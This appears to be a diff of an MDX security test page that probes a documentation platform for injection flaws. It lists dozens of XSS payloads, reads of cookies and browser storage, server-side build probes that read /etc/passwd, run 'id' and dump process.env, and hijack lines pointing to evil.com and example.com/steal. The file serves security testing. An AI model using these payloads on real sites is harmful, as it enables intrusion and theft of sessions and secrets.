@@ -1,77 +1,268 @@
 ---
 title: Security Test Page
-subtitle: MDX Expression Injection Testing
+subtitle: MDX Expression & Injection Testing
 slug: injection-tests
 ---
 
-## Test 1: Basic Expression Evaluation
+## Category A: JSX Expression Injection (Stored XSS)
 
-Result: {7*7}
+### A1: Arithmetic Evaluation
+{7*7}
 
-## Test 2: Document Domain
+### A2: Document Domain
+{String(document.domain)}
 
-Domain: {String(document.domain)}
+### A3: Document Cookie
+{String(document.cookie)}
 
-## Test 3: Document Cookie
+### A4: Window Location
+{String(window.location.href)}
 
-Cookie: {String(document.cookie)}
+### A5: Prototype Chain to globalThis
+{this.constructor.constructor('return globalThis')()}
 
-## Test 4: Window Location
+### A6: LocalStorage Enumeration
+{JSON.stringify(Object.keys(localStorage))}
 
-Location: {String(window.location.href)}
-
-## Test 5: Prototype Chain Walk
-
-Global: {this.constructor.constructor('return globalThis')()}
-
-## Test 6: LocalStorage Access
-
-Storage keys: {JSON.stringify(Object.keys(localStorage))}
-
-## Test 7: Script Tag in MDX
-
-<script>alert('xss-via-script-tag')</script>
-
-## Test 8: Image Onerror
-
-<img src="x" onerror="alert('xss-via-img')" />
-
-## Test 9: SVG Onload
-
-<svg onload="alert('xss-via-svg')"><circle r="50"/></svg>
-
-## Test 10: JavaScript Protocol Link
-
-[Click me](javascript:alert('xss-via-link'))
-
-## Test 11: Data URI Image
-
-![test](data:text/html,<script>alert('xss-via-data-uri')</script>)
-
-## Test 12: Iframe Injection
-
-<iframe src="javascript:alert('xss-via-iframe')"></iframe>
-
-## Test 13: Event Handler in Div
-
-<div onmouseover="alert('xss-via-mouseover')">Hover me</div>
-
-## Test 14: Details/Summary with Payload
-
-<details><summary>Click to expand</summary><img src=x onerror="alert('xss-via-details')"></details>
-
-## Test 15: Fetch Exfiltration Expression
-
-{(() => { try { return 'fetch-test-marker'; } catch(e) { return 'blocked'; } })()}
-
-## Test 16: Constructor Function Creation
-
+### A7: New Function Constructor
 {new Function('return document.domain')()}
 
-## Test 17: Template Literal
-
+### A8: Template Literal Evaluation
 {`template-${7*7}-literal`}
 
-## Test 18: Object.keys on Window
-
+### A9: IIFE with Return
 {(() => { try { return Object.keys(window).slice(0,5).join(','); } catch(e) { return 'blocked'; } })()}
+
+### A10: Fetch Beacon (exfil proof)
+{(() => { try { return 'fetch-exfil-marker-' + document.domain; } catch(e) { return 'blocked'; } })()}
+
+### A11: Navigator UserAgent Leak
+{String(typeof navigator !== 'undefined' ? navigator.userAgent : 'no-navigator')}
+
+### A12: Session Storage Access
+{(() => { try { return JSON.stringify(Object.keys(sessionStorage)); } catch(e) { return 'blocked'; } })()}
+
+### A13: Performance Timing Leak
+{(() => { try { return String(performance.timing?.navigationStart); } catch(e) { return 'blocked'; } })()}
+
+### A14: IndexedDB Enumeration
+{(() => { try { return String(typeof indexedDB); } catch(e) { return 'blocked'; } })()}
+
+---
+
+## Category B: HTML Tag Injection
+
+### B1: Script Tag
+<script>alert('xss-script')</script>
+
+### B2: Img Onerror
+<img src="x" onerror="alert('xss-img')" />
+
+### B3: SVG Onload
+<svg onload="alert('xss-svg')"><circle r="50"/></svg>
+
+### B4: Iframe with JS Protocol
+<iframe src="javascript:alert('xss-iframe')"></iframe>
+
+### B5: Object Tag
+<object data="javascript:alert('xss-object')"></object>
+
+### B6: Embed Tag
+<embed src="javascript:alert('xss-embed')">
+
+### B7: Body Onload (should be stripped)
+<body onload="alert('xss-body')">
+
+### B8: Input Onfocus with Autofocus
+<input onfocus="alert('xss-input')" autofocus>
+
+### B9: Marquee Onstart
+<marquee onstart="alert('xss-marquee')">test</marquee>
+
+### B10: Video Onerror
+<video><source onerror="alert('xss-video')"></video>
+
+### B11: Audio Onerror
+<audio src="x" onerror="alert('xss-audio')"></audio>
+
+### B12: Details Ontoggle
+<details ontoggle="alert('xss-details')" open><summary>click</summary>test</details>
+
+### B13: Math Tag (MathML)
+<math><maction actiontype="statusline"><mtext>hover</mtext><annotation-xml encoding="text/html"><img src=x onerror="alert('xss-math')"></annotation-xml></maction></math>
+
+---
+
+## Category C: Markdown Injection
+
+### C1: JavaScript Protocol Link
+[Click me](javascript:alert('xss-md-link'))
+
+### C2: JavaScript Protocol via Encoded
+[Click me](&#106;avascript:alert('xss-md-encoded'))
+
+### C3: Data URI Link
+[Click me](data:text/html,<script>alert('xss-md-data')</script>)
+
+### C4: Data URI Image
+![img](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCd4c3Mtc3ZnLWI2NCcpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)
+
+### C5: Markdown Image with Onerror
+![img](x "onerror=alert('xss-md-img')")
+
+### C6: Reference-style Link Injection
+[xss]: javascript:alert('xss-md-ref')
+[Click me][xss]
+
+### C7: Autolink with JS
+<javascript:alert('xss-autolink')>
+
+---
+
+## Category D: MDX Component Injection
+
+### D1: Component Prop Breakout
+<CodeBlock title="</CodeBlock><script>alert('xss-component-breakout')</script>">test</CodeBlock>
+
+### D2: Fern Card with JS href
+<Card title="XSS Test" href="javascript:alert('xss-card-href')">Click this card</Card>
+
+### D3: Fern Callout with Expression
+<Callout intent="warning">
+{String(document.cookie)}
+</Callout>
+
+### D4: Nested Component Expression
+<Steps>
+<Step title={`Step ${7*7}`}>
+{String(document.domain)}
+</Step>
+</Steps>
+
+### D5: Tab with Injected Title
+<Tabs>
+<Tab title="<img src=x onerror=alert('xss-tab')>">
+Content here
+</Tab>
+</Tabs>
+
+### D6: Accordion with Injected Title
+<Accordion title="<img src=x onerror=alert('xss-accordion')>">
+Content
+</Accordion>
+
+---
+
+## Category E: Novel / Advanced Injection
+
+### E1: CSS Injection via Style Tag
+<style>{'body{background:url("https://example.com/probe?leak=1")}'}</style>
+
+### E2: CSS @import
+<style>{'@import url("https://example.com/evil.css")'}</style>
+
+### E3: SVG with foreignObject
+<svg xmlns="http://www.w3.org/2000/svg">
+<foreignObject width="100%" height="100%">
+<div xmlns="http://www.w3.org/1999/xhtml">
+<img src=x onerror="alert('xss-foreignobject')"/>
+</div>
+</foreignObject>
+</svg>
+
+### E4: Base Tag Hijack
+<base href="https://example.com/">
+
+### E5: Meta Refresh Redirect
+<meta http-equiv="refresh" content="0;url=https://example.com/xss">
+
+### E6: Link Tag Stylesheet
+<link rel="stylesheet" href="https://example.com/evil.css">
+
+### E7: Form Action Injection
+<form action="https://example.com/steal"><input type="text" name="data"><input type="submit"></form>
+
+### E8: Anchor Target _blank with Opener
+<a href="https://example.com" target="_blank">Click (opener access)</a>
+
+### E9: Import Map Hijack
+<script type="importmap">{"imports":{"react":"https://evil.com/react.js"}}</script>
+
+### E10: Service Worker Registration Expression
+{(() => { try { if('serviceWorker' in navigator) { return 'sw-available-' + document.domain; } return 'no-sw'; } catch(e) { return 'blocked'; } })()}
+
+### E11: DOM Clobbering Setup
+<form id="x"><input name="domain" value="clobbered"></form>
+
+### E12: Unicode/Encoding Bypass
+{String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)}
+
+### E13: Eval via Expression
+{(() => { try { return eval('7*7'); } catch(e) { return 'eval-blocked'; } })()}
+
+### E14: setTimeout via Expression
+{(() => { try { setTimeout('', 0); return 'setTimeout-available'; } catch(e) { return 'setTimeout-blocked'; } })()}
+
+### E15: Fetch API Probe
+{(() => { try { return typeof fetch === 'function' ? 'fetch-available' : 'no-fetch'; } catch(e) { return 'blocked'; } })()}
+
+### E16: WebSocket Probe
+{(() => { try { return typeof WebSocket === 'function' ? 'ws-available' : 'no-ws'; } catch(e) { return 'blocked'; } })()}
+
+### E17: postMessage to Parent
+{(() => { try { if(window.parent !== window) { return 'has-parent-frame'; } return 'top-level'; } catch(e) { return 'cross-origin-parent'; } })()}
+
+### E18: Mutation Observer Probe
+{(() => { try { return typeof MutationObserver === 'function' ? 'mutationobserver-available' : 'no'; } catch(e) { return 'blocked'; } })()}
+
+### E19: Clipboard API Probe
+{(() => { try { return typeof navigator.clipboard !== 'undefined' ? 'clipboard-api-available' : 'no-clipboard'; } catch(e) { return 'blocked'; } })()}
+
+### E20: Geolocation API Probe
+{(() => { try { return typeof navigator.geolocation !== 'undefined' ? 'geolocation-available' : 'no'; } catch(e) { return 'blocked'; } })()}
+
+---
+
+## Category F: Import / Require Injection (Server-side Build)
+
+### F1: require('fs') — Node Built-in
+{(() => { try { return require('fs').readFileSync('/etc/passwd','utf8'); } catch(e) { return 'require-fs-blocked: ' + e.message; } })()}
+
+### F2: require('child_process') — Command Execution
+{(() => { try { return require('child_process').execSync('id').toString(); } catch(e) { return 'require-cp-blocked: ' + e.message; } })()}
+
+### F3: require('os') — OS Info Leak
+{(() => { try { return JSON.stringify(require('os').networkInterfaces()); } catch(e) { return 'require-os-blocked: ' + e.message; } })()}
+
+### F4: process.env Access
+{(() => { try { return JSON.stringify(process.env); } catch(e) { return 'process-env-blocked: ' + e.message; } })()}
+
+### F5: process.cwd
+{(() => { try { return process.cwd(); } catch(e) { return 'process-cwd-blocked: ' + e.message; } })()}
+
+### F6: __dirname / __filename
+{(() => { try { return typeof __dirname !== 'undefined' ? __dirname : 'undefined'; } catch(e) { return 'dirname-blocked'; } })()}
+
+---
+
+## Category G: Frontmatter Injection
+
+The frontmatter of this file uses standard YAML. If the YAML parser is vulnerable, these tests (in a separate file) would probe:
+- `title: "{{7*7}}"` — SSTI via Jinja2/Nunjucks
+- `title: !!python/object/apply:os.system ['id']` — YAML deserialization
+- `subtitle: "<script>alert(1)</script>"` — HTML in meta
+
+See `frontmatter-injection.mdx` for those tests.
+
+---
+
+## Category H: CSP and Security Header Probes
+
+### H1: Check if inline scripts execute
+<script>document.write('INLINE-SCRIPT-EXECUTED')</script>
+
+### H2: Check X-Frame-Options
+{(() => { try { return window.self === window.top ? 'not-framed' : 'framed'; } catch(e) { return 'x-frame-blocks'; } })()}
+
+### H3: Check for CSP nonce
+{(() => { try { const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return meta ? meta.content : 'no-csp-meta'; } catch(e) { return 'blocked'; } })()}
